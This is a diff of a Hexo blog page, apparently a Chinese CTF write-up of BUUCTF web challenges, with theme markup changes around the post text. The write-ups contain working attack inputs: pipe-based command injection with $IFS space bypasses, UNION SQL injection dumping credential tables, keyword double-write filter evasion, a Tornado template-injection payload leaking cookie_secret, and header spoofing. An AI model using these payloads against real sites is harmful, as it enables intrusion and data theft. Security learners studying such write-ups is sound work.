-<p><img data-src="https://tuchuangs.com/imgs/2022/10/18/1c74d0d28ed8bad3.png">可以看到是ping了输入的地址，联想到前面做过的题用|可以执行后面的命令？ip=127.0.0.1|ls可以看到</p>
-<p><img data-src="https://tuchuangs.com/imgs/2022/10/18/c88b59ba0ff56de7.png"></p>
+<p><img src="https://tuchuangs.com/imgs/2022/10/18/1c74d0d28ed8bad3.png">可以看到是ping了输入的地址，联想到前面做过的题用|可以执行后面的命令？ip=127.0.0.1|ls可以看到</p>
+<p><img src="https://tuchuangs.com/imgs/2022/10/18/c88b59ba0ff56de7.png"></p>
 <p>是可以执行的，但是经过后面一系列的尝试可以知道过滤了flag和空格，所以用?ip=127.0.0.1|cat$IFS$1index.php来得到源码</p>
 <p>空格绕过方式</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 </span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; 		//用逗号实现空格功能</span><br><span class="line">%09		//需要php环境</span><br></pre></td></tr></table></figure>
@@ -240,7 +317,7 @@ youlin = Hexo</title>
 <p>回到注入的思路上，查询字段数：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&#x27; order by 3%23&amp;password=1     存在</span><br><span class="line">/check.php?username=admin&#x27; order by 4%23&amp;password=1     报错</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="https://tuchuangs.com/imgs/2022/10/19/2841b101dec73ff8.png"></p>
+<p><img src="https://tuchuangs.com/imgs/2022/10/19/2841b101dec73ff8.png"></p>
 <p>可知共3个字段。用<code>union</code>查询测试注入点（回显点位）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1&#x27; union select 1,2,3%23&amp;password=1</span><br></pre></td></tr></table></figure>
 
@@ -257,14 +334,14 @@ youlin = Hexo</title>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=1&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</span><br></pre></td></tr></table></figure>
 
 <p>得到flag</p>
-<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p><img data-src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1666195536871.png" alt="1666195536871"></p>
+<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1666195536871.png" alt="1666195536871"></p>
 <p>一眼丁真，用中国菜刀直接连上shell</p>
-<p><img data-src="https://tuchuangs.com/imgs/2022/10/20/1169c6fb3d3eb192.png"></p>
+<p><img src="https://tuchuangs.com/imgs/2022/10/20/1169c6fb3d3eb192.png"></p>
 <p>flag在跟目录下</p>
 <h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>在网页源码中存在一个Secret.php，并在网页中无正常链接</p>
-<p><img data-src="https://tuchuangs.com/imgs/2022/10/20/a5667f18a5a235c6.png"></p>
-<p>于是，尝试访问该页面，提示请求源不是<code>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;</code>，如下图所示：It doesn’t come from ‘<span class="exturl" data-url="aHR0cHM6Ly9zeWNzZWNyZXQuYnV1b2ouY24mLyMzOTs=">https://Sycsecret.buuoj.cn&#39;</span></p>
-<p>接下来，就是用burpsuit抓包，<strong>通过指定Referer参数值为<span class="exturl" data-url="aHR0cHM6Ly9zeWNzZWNyZXQuYnV1b2ouY27mnaXkvKrpgKDor7fmsYLmupAv">https://Sycsecret.buuoj.cn来伪造请求源</span></strong>，继续尝试访问<code>http://node3.buuoj.cn:29399/Secret.php</code>页面</p>
+<p><img src="https://tuchuangs.com/imgs/2022/10/20/a5667f18a5a235c6.png"></p>
+<p>于是，尝试访问该页面，提示请求源不是<code>It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;</code>，如下图所示：It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn&/#39;">https://Sycsecret.buuoj.cn&#39;</a></p>
+<p>接下来，就是用burpsuit抓包，<strong>通过指定Referer参数值为<a target="_blank" rel="noopener" href="https://sycsecret.buuoj.cn来伪造请求源/">https://Sycsecret.buuoj.cn来伪造请求源</a></strong>，继续尝试访问<code>http://node3.buuoj.cn:29399/Secret.php</code>页面</p>
 <p>通过上面的请求伪造，得到响应页面：提示，需要使用<code>&quot;Syclover&quot; browser</code>浏览器。</p>
 <p>在http请求头中，<strong>通过修改User-Agent参数值为”Syclover” browser来伪造请求源所使用浏览器。</strong></p>
 <p>通过上面的请求伪造，得到响应页面：提示，你只能够在本地读取这个文件！！！</p>
@@ -283,7 +360,7 @@ youlin = Hexo</title>
 <h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>一个和前面几道题一样的登录界面，先尝试一遍万能密码，发现被过滤，尝试双写，发现可以正常登录进去</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; oorr 1=1#</span><br><span class="line">1&#x27; oorr 1=1#</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1666459083218.png" alt="1666459083218"></p>
+<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1666459083218.png" alt="1666459083218"></p>
 <p>接着就是用双写重复之前的sql注入操作</p>
 <p>爆出所有数据库：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(schema_name)frfromom</span><br><span class="line">(infoorrmation_schema.schemata) %23</span><br></pre></td></tr></table></figure>
@@ -301,7 +378,7 @@ youlin = Hexo</title>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=1 %27 ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) %23</span><br></pre></td></tr></table></figure>
 
 <p>flag{826b7bf2-106c-45b3-a375-2da2278897bf}</p>
-<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开题目，提示备份网站，直接扫描目录，得到<span class="exturl" data-url="aHR0cDovL3d3dy56aXAv">www.zip</span></p>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开题目，提示备份网站，直接扫描目录，得到<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
 <p>解压后得到源码</p>
 <p>几个重要php文件内容：</p>
 <p>index.php</p>
@@ -377,7 +454,7 @@ echo $b;
 <h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>根据题目提示，去查找他的备份文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -e git,svn,bak -u http://25480fe2-4471-4be6-81ac-bea8913b50e6.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="https://tuchuangs.com/imgs/2022/10/27/0a96d0093db00e6d.png"></p>
+<p><img src="https://tuchuangs.com/imgs/2022/10/27/0a96d0093db00e6d.png"></p>
 <p>访问/index.php.bak，可以得到源码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -430,7 +507,7 @@ echo $b;
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">	$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password == 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>用bp抓包,修改cookie:user=1，用post给password和money传参</p>
-<p><img data-src="https://tuchuangs.com/imgs/2022/11/02/3b756eba3b21ff75.png"></p>
+<p><img src="https://tuchuangs.com/imgs/2022/11/02/3b756eba3b21ff75.png"></p>
 <h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>题目打开有三个链接内容分明是以下三个</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br></pre></td></tr></table></figure>
 
@@ -446,7 +523,7 @@ echo $b;
 
 <p>报错，应该是存在过滤</p>
 <p>然后我们需要找到cookie_secret</p>
-<p>百度得到<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1Ub3JuYWRvJnNwbT0xMDAxLjIxMDEuMzAwMS43MDIw">Tornado</span>框架的附属文件handler.settings中存在cookie_secret</p>
+<p>百度得到<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Tornado&spm=1001.2101.3001.7020">Tornado</a>框架的附属文件handler.settings中存在cookie_secret</p>
 <p>此时构造payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://97bda1b4-f8f6-434e-a6cc-59a79fcca907.node4.buuoj.cn:81/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -455,325 +532,75 @@ echo $b;
 <p>得到提示信息，得到cookie_secret:19ef00ca-a6f3-4408-a303-2d1a585ff706</p>
 <p>然后结合md5(cookie_secret+md5(filename))</p>
 <p>即md5(‘19ef00ca-a6f3-4408-a303-2d1a585ff706’+md5(‘/fllllllllllllag’))</p>
-<p>得到<br><img data-src="https://s1.z6r7.com/i/2022/11/17/3ukol.png"></p>
+<p>得到<br><img src="https://s1.z6r7.com/i/2022/11/17/3ukol.png"></p>
 <p>然后得到payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=b6d767d2f8ed5d21a44b0e5886680cb9</span><br></pre></td></tr></table></figure>
 
 
-  </div>
+    </div>
 
-   <footer>
+    
+    
+    
 
-    <div class="meta">
-  <span class="item">
-    <span class="icon">
-      <i class="ic i-calendar-check"></i>
-    </span>
-    <span class="text">Edited on</span>
-    <time title="Modified: 2022-11-19 00:39:28" itemprop="dateModified" datetime="2022-11-19T00:39:28+08:00">2022-11-19</time>
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/10/11/house-of-emma/" rel="prev" title="house_of_emma">
+                  <i class="fa fa-chevron-left"></i> house_of_emma
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/10/16/docker/" rel="next" title="docker">
+                  docker <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
   </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
 </div>
-
-      
-<div class="reward">
-  <button><i class="ic i-heartbeat"></i> Donate</button>
-  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
-  <div id="qr">
-      
-      <div>
-        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
-        <p>WeChat Pay</p>
-      </div>
-      
-      <div>
-        <img data-src="/images/alipay.png" alt="John Doe Alipay">
-        <p>Alipay</p>
-      </div>
-      
-      <div>
-        <img data-src="/images/paypal.png" alt="John Doe PayPal">
-        <p>PayPal</p>
-      </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
   </div>
-</div>
 
-      
-
-<div id="copyright">
-<ul>
-  <li class="author">
-    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
-  </li>
-  <li class="link">
-    <strong>Post link: </strong>
-    <a href="http://wscyoulin.github.io/2022/10/14/buu-web%EF%BC%881-20%EF%BC%89/" title="buu_web（1-20）">http://wscyoulin.github.io/2022/10/14/buu-web（1-20）/</a>
-  </li>
-  <li class="license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
-  </li>
-</ul>
-</div>
-
+    </div>
   </footer>
 
-</article>
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
-  </div>
   
 
-<div class="post-nav">
-    <div class="item left">
-      
 
-  <a href="/2022/10/11/house-of-emma/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipevuctzzj20zk0m84qp.jpg" title="house_of_emma">
-  <span class="type">Previous Post</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>house_of_emma</h3>
-  </a>
 
-    </div>
-    <div class="item right">
-      
 
-  <a href="/2022/10/16/docker/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipey84bjtj20zk0m8hdt.jpg" title="docker">
-  <span class="type">Next Post</span>
-  <span class="category"><i class="ic i-flag"></i> </span>
-  <h3>docker</h3>
-  </a>
-
-    </div>
-</div>
 
   
-  <div class="wrap" id="comments"></div>
 
-
-        </div>
-        <div id="sidebar">
-          
-
-<div class="inner">
-
-  <div class="panels">
-    <div class="inner">
-      <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">1.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">3.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">4.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3"><span class="toc-number">4.1.</span> <span class="toc-text">知识详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter"><span class="toc-number">4.1.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">5.</span> <span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">8.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-number">9.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">10.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-number">11.</span> <span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-number">12.</span> <span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-number">13.</span> <span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-number">14.</span> <span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-number">15.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-number">16.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="toc-number">17.</span> <span class="toc-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-number">18.</span> <span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="toc-number">19.</span> <span class="toc-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">20.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a></li></ol>
-      </div>
-      <div class="related panel pjax" data-title="Related">
-      </div>
-      <div class="overview panel" data-title="Overview">
-        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <img class="image" itemprop="image" alt="John Doe"
-      data-src="/images/avatar.jpg">
-  <p class="name" itemprop="name">John Doe</p>
-  <div class="description" itemprop="description"></div>
-</div>
-
-<nav class="state">
-    <div class="item posts">
-      <a href="/archives/">
-        <span class="count">24</span>
-        <span class="name">posts</span>
-      </a>
-    </div>
-    <div class="item categories">
-      <a href="/categories/">
-        <span class="count">1</span>
-        <span class="name">categories</span>
-      </a>
-    </div>
-</nav>
-
-<div class="social">
-</div>
-
-<ul class="menu">
-  
-    
-  <li class="item">
-    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
-  </li>
-
-
-</ul>
-
-      </div>
-    </div>
-  </div>
-
-  <ul id="quick">
-    <li class="prev pjax">
-        <a href="/2022/10/11/house-of-emma/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
-    </li>
-    <li class="up"><i class="ic i-arrow-up"></i></li>
-    <li class="down"><i class="ic i-arrow-down"></i></li>
-    <li class="next pjax">
-        <a href="/2022/10/16/docker/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
-    </li>
-    <li class="percent"></li>
-  </ul>
-</div>
-
-
-        </div>
-        <div class="dimmer"></div>
-      </div>
-    </main>
-    <footer id="footer">
-      <div class="inner">
-        <div class="widgets">
-          
-<div class="rpost pjax">
-  <h2>Random Posts</h2>
-  <ul>
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出">整数溢出</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/04/awd_pwn%E6%80%BB%E7%BB%93/" title="awd_pwn总结">awd_pwn总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/04/0ctf-2017-babyheap/" title="0ctf_2017_babyheap">0ctf_2017_babyheap</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/14/house-of-cat/" title="house_of_cat">house_of_cat</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/21/aarch64/" title="aarch64">aarch64</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/11/house-of-emma/" title="house_of_emma">house_of_emma</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/08/01/io-file/" title="io_file">io_file</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/cometition/" title="In cometition">cometition</a>
-</div>
-
-    <span><a href="/2022/03/18/picoCTF-wp/" title="picoCTF_wp">picoCTF_wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/cometition/" title="In cometition">cometition</a>
-</div>
-
-    <span><a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" title="巅峰极客复现">巅峰极客复现</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/02/%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" title="堆利用总结">堆利用总结</a></span>
-  </li>
-
-  </ul>
-</div>
-<div>
-  <h2>Recent Comments</h2>
-  <ul class="leancloud-recent-comment"></ul>
-</div>
-
-        </div>
-        <div class="status">
-  <div class="copyright">
-    
-    &copy; 2010 – 
-    <span itemprop="copyrightYear">2022</span>
-    <span class="with-love">
-      <i class="ic i-sakura rotate"></i>
-    </span>
-    <span class="author" itemprop="copyrightHolder">John Doe @ youlin</span>
-  </div>
-  <div class="powered-by">
-    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
-  </div>
-</div>
-
-      </div>
-    </footer>
-  </div>
-<script data-config type="text/javascript">
-  var LOCAL = {
-    path: '2022/10/14/buu-web（1-20）/',
-    favicon: {
-      show: "（●´3｀●）Goooood",
-      hide: "(´Д｀)Booooom"
-    },
-    search : {
-      placeholder: "Search for Posts",
-      empty: "We didn't find any results for the search: ${query}",
-      stats: "${hits} results found in ${time} ms"
-    },
-    valine: true,fancybox: true,
-    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
-    ignores : [
-      function(uri) {
-        return uri.includes('#');
-      },
-      function(uri) {
-        return new RegExp(LOCAL.path+"$").test(uri);
-      }
-    ]
-  };
-</script>
-
-<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
-
-<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
-
-<script src="/js/app.js?v=0.2.5"></script>
 
 
 
